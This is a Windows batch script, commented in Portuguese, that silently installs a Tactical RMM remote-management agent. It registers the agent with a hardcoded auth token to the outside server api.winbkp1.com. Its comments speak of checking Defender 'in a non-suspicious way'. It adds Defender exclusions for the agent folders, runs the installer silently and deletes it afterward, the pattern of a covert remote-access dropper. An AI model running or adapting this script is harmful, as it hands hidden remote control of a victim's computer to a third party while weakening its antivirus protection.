@echo off
setlocal enabledelayedexpansion

:: Configura variáveis ajustando aspas
set "innosetup=tacticalagent-v2.9.0-windows-amd64.exe"
set "api=https://api.winbkp1.com"
set "clientid=2"
set "siteid=2"
set "agenttype=server"
set "auth=f92904d28eb8b03a8cce9033e654e3cb86e3203dc6e7d7820183eb14c6537cb7"
set "downloadlink=https://github.com/amidaware/rmmagent/releases/download/v2.9.0/tacticalagent-v2.9.0-windows-amd64.exe"

:: TLS 1.2 via PowerShell nativo
powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"

:: Verifica Defender de forma não suspeita
powershell -c "try {if ((Get-MpComputerStatus).AntivirusEnabled) { exit 0 } else { exit 1 }} catch { exit 1 }"
set defender_status=%errorlevel%

if %defender_status% equ 0 (
    powershell -c "Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' -ErrorAction SilentlyContinue"
    powershell -c "Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*' -ErrorAction SilentlyContinue"
)

:: Teste de conexão otimizado
set connected=0
for /l %%i in (1,1,3) do (
    powershell -c "Test-NetConnection -ComputerName api.winbkp1.com -Port 443 -InformationLevel Quiet" && (
        set connected=1
        goto :connected
    )
    timeout /t 5 >nul
)
:connected

if %connected% equ 0 (
    :: Download usando técnica alternativa
    powershell -c "Invoke-WebRequest -Uri '%downloadlink%' -OutFile '%TMP%\%innosetup%' -UseBasicParsing"

    :: Instalação segmentada
    start /wait "" "%TMP%\%innosetup%" /VERYSILENT /SUPPRESSMSGBOXES
    timeout /t 5 >nul

    :: Execução com parâmetros dinâmicos
    "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api "%api%" --client-id %clientid% --site-id %siteid% --agent-type %agenttype% --nomesh --silent --auth "%auth%"

    :: Limpeza segura
    del /q "%TMP%\%innosetup%" >nul 2>&1
    exit /b 0
) else (
    exit /b 1
)